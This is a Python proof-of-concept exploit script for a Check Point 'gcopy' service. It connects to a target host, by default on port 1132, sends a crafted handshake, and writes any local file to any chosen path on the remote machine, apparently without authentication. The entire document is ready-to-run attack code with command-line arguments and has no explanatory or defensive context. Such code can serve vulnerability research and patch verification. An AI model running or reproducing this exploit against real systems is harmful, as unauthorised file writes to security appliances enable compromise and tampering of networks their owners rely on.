#!/usr/bin/env python

#  Check Point gcopy PoC

import socket
import sys
import os

print("Check Point gcopy PoC\n")

if len(sys.argv) < 5:
    print('gcopy_poc.py <HOST> <PORT> <SRC_FILE> <DST_FILE>')
    sys.exit(1)

TARGET_HOST = sys.argv[1]
TARGET_PORT = int(sys.argv[2])  # Default 1132
SRC_FILE = sys.argv[3]  # Local file name to transfer
DST_FILE = sys.argv[4]  # Remote file to write

# Connect to gcopy service:
try:
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.settimeout(5)
    _socket.connect((TARGET_HOST, TARGET_PORT))
except socket.error as msg:
    print("Couldn't connect to gcopy: %s\nTerminating program" % msg)
    sys.exit(1)

# Open file
try:
    file_size = os.path.getsize(SRC_FILE)
    f = open(SRC_FILE, 'rb')
    data = f.read(10000)
except OSError as msg:
    print("File access error: %s\nTerminating program" % msg)
    sys.exit(1)

# Handshake
_socket.send(b'\x00\x00\x00\x01')
_socket.send(len(DST_FILE).to_bytes(4, 'big') + \
             b'\x00\x00\x00\x00\x00\x00\x00\x00' + \
             file_size.to_bytes(4, 'big') + \
             b'\x00\x00\x00\x00\x00\x00\x81\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

_socket.send(DST_FILE.encode('ascii'))  # Send DST file name

# Send data
print('Sending data...')
while data:
    _socket.send(data)
    data = f.read(10000)
f.close()

if (_socket.recv(4) != b'\x00\x00\x00\x01'):
    print('Wrong response!')
    _socket.close()
    sys.exit(1)
else:
    print('Done')
    print('MD5 hash of received file: ' + _socket.recv(32).decode())
    _socket.send(b'\x00\x00\x00\x01')
